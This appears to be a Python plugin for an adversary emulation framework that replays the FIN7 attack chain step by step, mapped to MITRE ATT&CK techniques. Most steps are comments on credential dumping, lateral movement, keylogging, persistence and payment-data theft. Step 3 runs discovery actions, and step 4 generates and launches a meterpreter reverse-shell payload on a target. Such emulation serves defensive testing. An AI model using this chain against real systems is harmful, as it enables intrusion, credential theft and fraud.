#!/usr/bin/env python3

# Adversary emulation for FIN7

from plugins.base.attack import AttackPlugin
from app.interface_sfx import CommandlineColors
from app.metasploit import MSFVenom
import os



class FIN7Plugin(AttackPlugin):

    # Boilerplate
    name = "fin7_1"
    description = "A plugin simulating the FIN7 adversary"
    ttp = "multiple"
    references = ["https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Emulation_Plan/Scenario_1"]

    required_files_attacker = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share

    def __init__(self):
        super().__init__()
        self.plugin_path = __file__

    def step1(self):
        self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 1: Initial Breach{CommandlineColors.ENDC}", 1)
        # TODOS: No idea if we can replicate that automated as those are manual tasks

        # RTF with VB payload (needs user interaction)
        # playoad executed by mshta
        # mshta build js payload
        # mshta copies wscript.exe to ADB156.exe
        # winword.exe spawns verclsid.exe
        # mshta uses taskschd.dll to create a task in 5 minutes


        self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}End Step 1: Initial Breach{CommandlineColors.ENDC}", 1)

    def step2(self):
        self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 2: Delayed Malware Execution{CommandlineColors.ENDC}", 1)

        # scheduled task spawns Adb156.exe via svchost https://attack.mitre.org/techniques/T1053/005/
        # Adb156.exe loads scrobj.dll and executes sql-rat.js via jscript https://attack.mitre.org/techniques/T1059/007/
        # Adb156.exe connects via MSSQL to attacker server
        # WMI quieries for network information and system information https://attack.mitre.org/techniques/T1016/ and https://attack.mitre.org/techniques/T1082/ (Caldera ?)

        self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}End Step 2: Delayed Malware Execution{CommandlineColors.ENDC}", 1)

    def step3(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 3: Target Assessment{CommandlineColors.ENDC}", 1)

        # TODO: Make sure logging is nice and complete

        # WMI queries  https://attack.mitre.org/techniques/T1057/

        # Execute net view from spawned cmd https://attack.mitre.org/techniques/T1135/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}new view {CommandlineColors.ENDC}", 1)
        self.caldera_attack(self.targets[0], "deeac480-5c2a-42b5-90bb-41675ee53c7e", parameters={"remote.host.fqdn": self.targets[0].get_ip()})

        # check for sandbox https://attack.mitre.org/techniques/T1497/
        # The documentation does not define how it is checking exactly.
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}get-wmiobject win32_computersystem | fl model{CommandlineColors.ENDC}", 1)
        self.caldera_attack(self.targets[0], "5dc841fd-28ad-40e2-b10e-fb007fe09e81")

        # query username https://attack.mitre.org/techniques/T1033/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}query USERNAME env{CommandlineColors.ENDC}", 1)
        self.caldera_attack(self.targets[0], "c0da588f-79f0-4263-8998-7496b1a40596")

        # TODO: query computername https://attack.mitre.org/techniques/T1082/
        # self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}query COMPUTERNAME env{CommandlineColors.ENDC}", 1)
        #self.caldera_attack(self.targets[0], "c0da588f-79f0-4263-8998-7496b1a40596")

        # TODO: load adsldp.dll and call dllGetClassObject() for the Windows Script Host ADSystemInfo Object COM object https://attack.mitre.org/techniques/T1082/
        # WMI query for System Network Configuration discovery https://attack.mitre.org/techniques/T1016/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Network configuration discovery. Original is some WMI, here we are using nbstat{CommandlineColors.ENDC}", 1)
        self.caldera_attack(self.targets[0], "14a21534-350f-4d83-9dd7-3c56b93a0c17")
        # System Info discovery https://attack.mitre.org/techniques/T1082/
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}System info discovery, as close as it gets{CommandlineColors.ENDC}",
            1)
        self.caldera_attack(self.targets[0], "b6b105b9-41dc-490b-bc5c-80d699b82ce8")
        # CMD.exe->powershell.exe, start takeScreenshot.ps1 https://attack.mitre.org/techniques/T1113/
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Take screenshot{CommandlineColors.ENDC}",
            1)
        self.caldera_attack(self.targets[0], "316251ed-6a28-4013-812b-ddf5b5b007f8")
        # TODO: Upload that via MSSQL transaction https://attack.mitre.org/techniques/T1041/

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 3: Target Assessment{CommandlineColors.ENDC}", 1)

    def step4(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 4: Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)

        # Uploaded stager creates meterpreter shell (babymetal)
        # Generate payload:

        payload_name = "clickme.exe"
        venom = MSFVenom(self.attacker_machine_plugin, self.targets[0])
        venom.generate_payload(payload="linux/x64/meterpreter_reverse_tcp",
                             architecture="x64",
                             platform="linux",
                             # lhost,
                             format="elf",
                             outfile=payload_name)
        self.attacker_machine_plugin.get(payload_name, self.targets[0].get_machine_path_external())
        src = os.path.join(self.targets[0].get_machine_path_external(), payload_name)
        self.targets[0].put(src, self.targets[0].get_playground())
        if self.targets[0].get_playground() is not None:
            pl = os.path.join(self.targets[0].get_playground(), payload_name)
        else:
            pl = payload_name
        self.targets[0].remote_run(pl, disown=True)

        # adb156.exe -> cmd.exe ->powershell.exe decodes embedded dll payload https://attack.mitre.org/techniques/T1059/003/ and https://attack.mitre.org/techniques/T1059/001/
        # powershell cmdlet Invoke-Expression executes decoded dll https://attack.mitre.org/techniques/T1140/
        # powershell.exe loads shellcode into memory (received from C2 server) https://attack.mitre.org/techniques/T1573/

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 4: Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)

    def step5(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 5: Escalate Privileges{CommandlineColors.ENDC}", 1)

        # This is meterpreter !

        # powershell -> CreateToolHelp32Snapshot() for process discovery (Caldera alternative ?) https://attack.mitre.org/techniques/T1057/
        # powershell download from C2 server: samcat.exe (mimikatz) https://attack.mitre.org/techniques/T1507/
        # execute uac-samcats.ps1 This: spawns a powershell from powershell -> samcat.exe as high integrity process https://attack.mitre.org/techniques/T1548/002/
        # samcat.exe: reads local credentials https://attack.mitre.org/techniques/T1003/001/
        # powershell: GetIpNetTable() doe ARP entries (Caldera ?) https://attack.mitre.org/techniques/T1016/
        # powershell: nslookup to query domain controler for ip from ARP (Caldera ?) https://attack.mitre.org/techniques/T1018/

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 5: Escalate Privileges{CommandlineColors.ENDC}", 1)

    def step6(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 6: Expand Access{CommandlineColors.ENDC}", 1)

        # This is meterpreter !

        # powershell download: paexec.exe and hollow.exe https://attack.mitre.org/techniques/T1105/
        # spawn powershell through cmd
        # use password with paexec to move lateral to it admin host https://attack.mitre.org/techniques/T1021/002/
        # paexec  starts temorary windows service and executes hollow.exe https://attack.mitre.org/techniques/T1021/002/
        # hollow.exe spawns svchost and unmaps memory image https://attack.mitre.org/techniques/T1055/012/
        # svchost starts data exchange

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 6: Expand Access{CommandlineColors.ENDC}", 1)

    def step7(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 7: Setup User Monitoring{CommandlineColors.ENDC}", 1)

        # This is meterpreter !
        # Emulating DLL hijacking functionality of BOOSTWRITE

        # Create BOOSTWRITE meterpreter handler
        # Create temporary HTTP server serving "B" as XOR Key
        # hollow.exe meterpreter session dowloads BOOSTWRITE.dll to srrstr.dll https://attack.mitre.org/techniques/T1105/
        # cmd.exe spawns svchost.exe -> executes SystemPropertiesAdvanced.exe which executes srrstr.dll
        # srrstr.dll spawns rundll32.exe which communicates to metasploit. New shell !

        # => Adversary gets a new shell

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 7: Setup User Monitoring{CommandlineColors.ENDC}", 1)

    def step8(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 8: User Monitoring{CommandlineColors.ENDC}", 1)

        # This is meterpreter !

        # Meterpreter migrates to explorer.exe (from svchost) https://attack.mitre.org/techniques/T1055/
        # screenspy for screen capture https://attack.mitre.org/techniques/T1113/
        # migrate session to mstsc.exe https://attack.mitre.org/techniques/T1056/001/
        # deploy keylogger https://attack.mitre.org/techniques/T1056/001/

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 8: User Monitoring{CommandlineColors.ENDC}", 1)

    def step9(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 9: Setup Shim Persistence{CommandlineColors.ENDC}", 1)

        # This is meterpreter !

        # powershell.exe executes base64 encoded commands (Caldera ?)
        # Downloads dll329.dll and sdbE376
        # persistence: sdbinst.exe installs sdbE376.tmp for application shimming https://attack.mitre.org/techniques/T1546/011/

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 9: Setup Shim Persistence{CommandlineColors.ENDC}", 1)

    def step10(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 10: Steal Payment Data{CommandlineColors.ENDC}", 1)

        # This is meterpreter !

        # Scenario target is the fake payment application AccountingIQ.exe

        # Machine is rebooted
        # shim dll329.dll is activated https://attack.mitre.org/techniques/T1546/011/
        # AccountingIQ injects into SyncHost.exe, rundll32.exe communicates to C2
        # debug.exe is downloaded from C2, does process discovery https://attack.mitre.org/techniques/T1105/
        # send 7za.exe to target. Zip stolen data, exfiltrate

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 10: Steal Payment Data{CommandlineColors.ENDC}", 1)

    def run(self, targets):
        """ Run the command

        @param targets: A list of targets
        """

        self.step1()
        self.step2()
        # self.step3()  # Done and works
        self.step4()
        self.step5()
        self.step6()
        self.step7()
        self.step8()
        self.step9()
        self.step10()

        return ""
